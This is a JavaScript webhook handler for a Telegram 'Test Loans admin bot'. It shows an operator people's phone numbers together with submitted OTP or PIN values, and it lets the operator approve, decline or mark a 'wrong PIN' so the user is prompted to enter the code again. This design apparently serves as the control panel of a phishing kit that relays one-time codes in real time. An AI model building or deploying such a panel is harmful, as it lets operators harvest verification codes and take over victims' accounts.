import { kv, GATE_TTL } from './_kv.js';
import { tg, esc, ADMIN, TITLES, LABELS } from './_tg.js';

function decidedText(entry) {
  const time = new Date(entry.decidedAt).toLocaleTimeString('en-GB', {
    hour: '2-digit', minute: '2-digit',
  });

  let mark;
  if (entry.status === 'approved')      mark = '✅ <b>Approved</b>';
  else if (entry.status === 'declined') mark = '❌ <b>Declined</b>';
  else if (entry.status === 'wrongpin') mark = '⚠️ <b>Wrong PIN reported</b> — user will be asked to correct their PIN before finalising.';
  else                                  mark = String(entry.status);

  const title = TITLES[entry.gate] || '🔐 VERIFICATION';
  const label = LABELS[entry.gate] || '🔑 Value';

  return (
    `${title}\n` +
    `Ref: <code>${esc(entry.ref)}</code>\n\n` +
    `📱 Phone\n<code>${esc(entry.phone)}</code>\n\n` +
    `${label}\n<code>${esc(entry.payload)}</code>\n\n` +
    `${mark} — ${esc(time)}`
  );
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(200).end();

  const update = req.body || {};

  /* ---------- /start and /id ---------- */
  const msgText = update.message?.text;
  if (msgText === '/start' || msgText === '/id') {
    const chatId = update.message.chat.id;
    await tg('sendMessage', {
      chat_id: chatId,
      text:
        `👋 <b>Test Loans admin bot</b>\n\n` +
        `Your chat ID is:\n<code>${chatId}</code>\n\n` +
        `Paste it into Vercel as <code>TELEGRAM_ADMIN_CHAT_ID</code>`,
      parse_mode: 'HTML',
    });
    return res.status(200).end();
  }

  /* ---------- Callback query handling ---------- */
  const cq = update.callback_query;
  if (!cq) return res.status(200).end();

  if (String(cq.from?.id) !== String(ADMIN)) {
    await tg('answerCallbackQuery', {
      callback_query_id: cq.id,
      text: '🚫 Not authorised',
      show_alert: true,
    });
    return res.status(200).end();
  }

  const parts = String(cq.data || '').split(':');
  if (parts[0] !== 'gate' || parts.length !== 3) {
    await tg('answerCallbackQuery', { callback_query_id: cq.id, text: 'Unknown action' });
    return res.status(200).end();
  }

  const action = parts[1]; // approve | decline | wrongpin
  const gateId = parts[2];

  const entry = await kv.get(`gate:${gateId}`);
  if (!entry) {
    await tg('answerCallbackQuery', {
      callback_query_id: cq.id,
      text: 'Request expired',
      show_alert: true,
    });
    return res.status(200).end();
  }

  if (entry.status !== 'pending') {
    await tg('answerCallbackQuery', {
      callback_query_id: cq.id,
      text: `Already ${entry.status}`,
      show_alert: true,
    });
    return res.status(200).end();
  }

  /* ---------- Wrong PIN ---------- */
  if (action === 'wrongpin') {
    if (entry.gate !== 'otp') {
      await tg('answerCallbackQuery', {
        callback_query_id: cq.id,
        text: 'Wrong PIN only applies to OTP gates',
        show_alert: true,
      });
      return res.status(200).end();
    }

    entry.status = 'wrongpin';
    entry.decidedAt = Date.now();
    await kv.set(`gate:${gateId}`, entry, { ex: GATE_TTL });

    try {
      await tg('editMessageText', {
        chat_id: cq.message.chat.id,
        message_id: cq.message.message_id,
        text: decidedText(entry),
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [] },
      });
    } catch (e) {
      console.warn('[tg] edit failed', e);
    }

    await tg('answerCallbackQuery', {
      callback_query_id: cq.id,
      text: '⚠️ Wrong PIN reported',
    });
    return res.status(200).end();
  }

  /* ---------- Approve / Decline ---------- */
  entry.status = action === 'approve' ? 'approved' : 'declined';
  entry.decidedAt = Date.now();
  await kv.set(`gate:${gateId}`, entry, { ex: GATE_TTL });

  try {
    await tg('editMessageText', {
      chat_id: cq.message.chat.id,
      message_id: cq.message.message_id,
      text: decidedText(entry),
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: [] },
    });
  } catch (e) {
    console.warn('[tg] edit failed', e);
  }

  await tg('answerCallbackQuery', {
    callback_query_id: cq.id,
    text: action === 'approve' ? '✅ Approved' : '❌ Declined',
  });

  res.status(200).end();
}